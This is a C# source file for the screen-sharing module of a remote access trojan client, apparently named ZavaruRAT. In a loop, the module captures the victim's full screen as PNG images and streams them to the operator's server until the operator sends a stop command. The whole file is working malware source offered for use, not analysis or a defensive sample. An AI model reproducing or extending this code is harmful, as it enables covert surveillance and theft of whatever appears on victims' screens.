#region

using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using Windows.Win32;
using Windows.Win32.UI.WindowsAndMessaging;
using ZavaruRAT.Client.Sdk;
using ZavaruRAT.Shared.Models.Client;

#endregion

namespace ZavaruRAT.Client.Modules;

public sealed class ScreenShareModule : ModuleBase
{
    public async Task<RealTimeExecutionResult> ScreenCapture()
    {
        var monitorHeight = PInvoke.GetSystemMetrics(SYSTEM_METRICS_INDEX.SM_CYSCREEN);
        var monitorWidth = PInvoke.GetSystemMetrics(SYSTEM_METRICS_INDEX.SM_CXSCREEN);

        while (true)
        {
            var screen = TakeScreenshot(monitorHeight, monitorWidth);
            try
            {
                await Context.Client.SendAsync(new CommandResult
                {
                    Status = CommandResultStatus.RealTime,
                    Result = screen
                });
            }
            catch
            {
                Debug.WriteLine("Unable to sent");
            }

            Debug.WriteLine("Sent screen");

            try
            {
                var mock = await Context.Client.ReceiveAsync<Command>(500);
                if (mock != null)
                {
                    await Context.Client.SendAsync(CommandResult.Empty);

                    break;
                }
            }
            catch
            {
                Debug.WriteLine("No stop so continue");
                // ignored
            }
        }

        Debug.WriteLine("Sending finished");

        return new RealTimeExecutionResult();
    }

    private static byte[] TakeScreenshot(int monitorHeight, int monitorWidth)
    {
        using var bitmap = new Bitmap(monitorWidth, monitorHeight);
        using (var g = Graphics.FromImage(bitmap))
        {
            g.CopyFromScreen(0, 0, 0, 0,
                             bitmap.Size, CopyPixelOperation.SourceCopy);
        }

        using var ms = new MemoryStream();
        bitmap.Save(ms, ImageFormat.Png);

        return ms.ToArray();
    }
}
